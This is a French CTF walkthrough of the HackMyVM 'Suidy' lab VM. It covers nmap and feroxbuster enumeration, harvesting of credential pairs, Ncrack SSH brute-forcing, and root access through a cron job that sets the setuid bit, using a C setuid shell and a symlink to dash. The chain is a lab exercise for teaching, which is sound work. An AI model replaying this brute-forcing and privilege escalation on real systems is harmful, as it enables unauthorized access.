---
title: "Solution du CTF Suidy de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

`Suidy` est un CTF centré sur Unix donc plutôt classique. On regrettera qu'il faille utiliser toutes les wordlists de la terre pour arriver à ses fins, comme si changer un nom de fichier sur une ligne de commande avait le moindre bénéfice pédagogique.

Si vous créez votre propre CTF, utilisez toujours des noms communs quand il s'agit pour le participant de "deviner".

```console
$ sudo nmap -T5 -p- -sCV --script vuln 192.168.242.138
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.138
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
--- snip ---
|       CVE-2018-20685  5.3     https://vulners.com/cve/CVE-2018-20685
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   nginx 1.14.2: 
|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
|       NGINX:CVE-2022-41741    7.8     https://vulners.com/nginx/NGINX:CVE-2022-41741
|       DF1BBDC4-B715-5ABE-985E-91DD3BB87773    7.8     https://vulners.com/githubexploit/DF1BBDC4-B715-5ABE-985E-91DD3BB87773  *EXPLOIT*
|       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041  *EXPLOIT*
|       CVE-2022-41741  7.8     https://vulners.com/cve/CVE-2022-41741
|       8A98070F-5CA5-5FC8-A5A7-593813F1D57E    7.8     https://vulners.com/githubexploit/8A98070F-5CA5-5FC8-A5A7-593813F1D57E  *EXPLOIT*
--- snip ---
|       NGINX:CVE-2024-7347     5.7     https://vulners.com/nginx/NGINX:CVE-2024-7347
|       NGINX:CVE-2025-23419    5.3     https://vulners.com/nginx/NGINX:CVE-2025-23419
|       CVE-2019-20372  5.3     https://vulners.com/cve/CVE-2019-20372
|_      PACKETSTORM:162830      0.0     https://vulners.com/packetstorm/PACKETSTORM:162830      *EXPLOIT*
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:7C:87:B3 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.42 seconds
```

Nmap a détecté le fichier `robots.txt`. Ce dernier contient beaucoup de lignes vides. Voici le contenu nettoyé :

```console
curl -s http://192.168.242.138/robots.txt | grep -v "^$"
/hi
/....\..\.-\--.\.-\..\-.
/shehatesme
```

Ce dernier dossier contient une page web :

```
She hates me because I FOUND THE REAL SECRET!
I put in this directory a lot of .txt files.
ONE of .txt files contains credentials like "theuser/thepass" to access to her system!
All that you need is an small dict from Seclist!
```

SecList ? small ? Je me suis bien sûr servi de la wordlist `raft-small-words.txt`. Ca m'a remonté différents fichiers :

```console
$ feroxbuster -u http://192.168.242.138/shehatesme/ -w raft-small-words.txt -x txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.242.138/shehatesme/
 🚀  Threads               │ 50
 📖  Wordlist              │ raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [txt]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        1w       16c http://192.168.242.138/shehatesme/search.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/admin.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/blog.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/page.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/privacy.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/forums.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/about.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/new.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/es.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/link.txt
200        6l       42w      229c http://192.168.242.138/shehatesme/
200        1l        1w       16c http://192.168.242.138/shehatesme/jobs.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/java.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/space.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/welcome.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/google.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/other.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/art.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/guide.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/faqs.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/secret.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/network.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/2001.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/smilies.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/folder.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/issues.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/full.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/airport.txt
200        1l        1w       16c http://192.168.242.138/shehatesme/alba.txt
[####################] - 10s    86006/86006   0s      found:29      errors:0      
[####################] - 10s    86006/86006   8348/s  http://192.168.242.138/shehatesme/
```

Une fois mis au propre dans un fichier `list.txt`, je récupère les credentials présents dans les fichiers :

```console
$ for line in $(cat list.txt); do curl -s "$line"; done | sort | uniq
hidden1/passZZ!
jaime11/JKiufg6
jhfbvgt/iugbnvh
john765/FDrhguy
maria11/jhfgyRf
mmnnbbv/iughtyr
nhvjguy/kjhgyut
smileys/98GHbjh
yuijhse/hjupnkk
```

J'ai passé ça à Ncrack pour brute-forcer les comptes SSH mais il n'a rien trouvé...

Pour tenter le tout pour le tout, j'ai eu recours à rockyou qui n'est pas du tout "small" :

```bash
feroxbuster -u http://192.168.242.138/shehatesme/ -w rockyou.txt -x txt -n |grep -e "^200" | grep txt | awk '{ print $5 }' > list.txt
```

Retour sur Ncrack qui ne trouve toujours pas de compte valide depuis les fichiers texte trouvés...

Complétement bloqué, j'ai dû ouvrir la VM pour voir ce que c'était... et le mot à utiliser est `procps`.

Voici une recherche sur le mot `procps` sur le répo SecLists :

`https://github.com/search?q=repo%3Adanielmiessler%2FSecLists%20procps&type=code`

Oooooh ! Aucun résultat. L'auteur a plus d'hallucinations que les premières versions de ChatGPT.

Il fallait donc trouver ces identifiants :

`procps.txt`  `theuser/thepass`

Ils nous permettent d'obtenir le premier flag :

```console
theuser@suidy:~$ cat user.txt 
HMV2353IVI
```

Sans surprises, on trouve un binaire setuid :

```console
theuser@suidy:~$ find / -type f -perm -u+s -ls 2> /dev/null 
   136287     20 -rwsrwsr-x   1 root     theuser     16704 sep 26  2020 /home/suidy/suidyyyyy
     3562     64 -rwsr-xr-x   1 root     root        63568 ene 10  2019 /usr/bin/su
     3890     36 -rwsr-xr-x   1 root     root        34888 ene 10  2019 /usr/bin/umount
     3888     52 -rwsr-xr-x   1 root     root        51280 ene 10  2019 /usr/bin/mount
       62     84 -rwsr-xr-x   1 root     root        84016 jul 27  2018 /usr/bin/gpasswd
       59     56 -rwsr-xr-x   1 root     root        54096 jul 27  2018 /usr/bin/chfn
     3415     44 -rwsr-xr-x   1 root     root        44440 jul 27  2018 /usr/bin/newgrp
       63     64 -rwsr-xr-x   1 root     root        63736 jul 27  2018 /usr/bin/passwd
       60     44 -rwsr-xr-x   1 root     root        44528 jul 27  2018 /usr/bin/chsh
    12498     52 -rwsr-xr--   1 root     messagebus    51184 jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    15846    428 -rwsr-xr-x   1 root     root         436552 ene 31  2020 /usr/lib/openssh/ssh-keysign
   137189     12 -rwsr-xr-x   1 root     root          10232 mar 28  2017 /usr/lib/eject/dmcrypt-get-device
```

Ce dernier donne directement un shell pour l'utilisateur `suidy` :

```console
theuser@suidy:~$ /home/suidy/suidyyyyy
suidy@suidy:~$ id
uid=1001(suidy) gid=1000(theuser) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
suidy@suidy:~$ cd /home/suidy
suidy@suidy:/home/suidy$ ls -al
total 52
drwxr-xr-x 3 suidy suidy    4096 sep 27  2020 .
drwxr-xr-x 4 root  root     4096 sep 26  2020 ..
-rw------- 1 suidy suidy      12 sep 27  2020 .bash_history
-rw-r--r-- 1 suidy suidy     220 sep 26  2020 .bash_logout
-rw-r--r-- 1 suidy suidy    3526 sep 26  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 sep 26  2020 .local
-r--r----- 1 suidy suidy     197 sep 26  2020 note.txt
-rw-r--r-- 1 suidy suidy     807 sep 26  2020 .profile
-rwsrwsr-x 1 root  theuser 16704 sep 26  2020 suidyyyyy
suidy@suidy:/home/suidy$ cat note.txt 
I love SUID files!
The best file is suidyyyyy because users can use it to feel as I feel.
root know it and run an script to be sure that my file has SUID. 
If you are "theuser" I hate you!

-suidy
```

Le fichier texte mentionne un script qui donne à priori le bit setuid sur le binaire.

J'ai surveillé les process avec `pspy` mais tout ce qu'on voyait, c'était ça :

```
2025/05/18 16:17:01 CMD: UID=0    PID=13930  | sh /root/timer.sh
```

J'ai écrit le code C suivant :

```c
#include <unistd.h>
#include <stdlib.h>

int main(void) {
  setuid(0);
  setgid(0);
  system("bash");
  return 0;
}
```

J'ai compilé et remplacé le fichier original :

```console
suidy@suidy:/tmp$ gcc -o getroot getroot.c 
suidy@suidy:/tmp$ cp getroot /home/suidy/suidyyyyy 
cp: no se puede crear el fichero regular '/home/suidy/suidyyyyy': El fichero de texto está ocupado
```

Le fichier est utilisé, car on a notre shell setuid qui tourne.

J'ai ajouté une clé SSH à l'utilisateur et je me suis reconnecté.

```console
suidy@suidy:~$ cp /tmp/getroot suidyyyyy 
cp: no se puede crear el fichero regular 'suidyyyyy': Permiso denegado
```

Cette fois, c'est parce que le propriétaire du binaire est root. Comme on est propriétaire du dossier parent, on peut le déplacer. 

```console
suidy@suidy:~$ cp /tmp/getroot suidyyyyy 
cp: no se puede crear el fichero regular 'suidyyyyy': Permiso denegado
suidy@suidy:~$ mv suidyyyyy yolo
suidy@suidy:~$ cp /tmp/getroot suidyyyyy 
suidy@suidy:~$ ls -al suidyyyyy
-rwxr-xr-x 1 suidy suidy 16712 may 18 16:23 suidyyyyy
suidy@suidy:~$ ls -al suidyyyyy
-rwxr-xr-x 1 suidy suidy 16712 may 18 16:23 suidyyyyy
suidy@suidy:~$ ls -al suidyyyyy
-rwsr-sr-x 1 suidy suidy 16712 may 18 16:23 suidyyyyy
```

Visiblement le cronjob ne fait que mettre le bit setuid, il ne change pas le propriétaire...

À la place, je vais faire un lien symbolique vers `dash` qui appartient déjà à root :

```console
suidy@suidy:~$ rm suidyyyyy 
suidy@suidy:~$ which dash
/usr/bin/dash
suidy@suidy:~$ ln -s /usr/bin/dash suidyyyyy
suidy@suidy:~$ ls -al /usr/bin/dash
-rwsr-sr-x 1 root root 121464 ene 17  2019 /usr/bin/dash
suidy@suidy:~$ dash -p
# id
uid=1001(suidy) gid=1001(suidy) euid=0(root) egid=0(root) grupos=0(root),1001(suidy)
# cd /root
# ls
root.txt  timer.sh
# cat root.txt
HMV0000EVE
# cat timer.sh  
#!/bin/sh
chmod +s /home/suidy/suidyyyyy
```
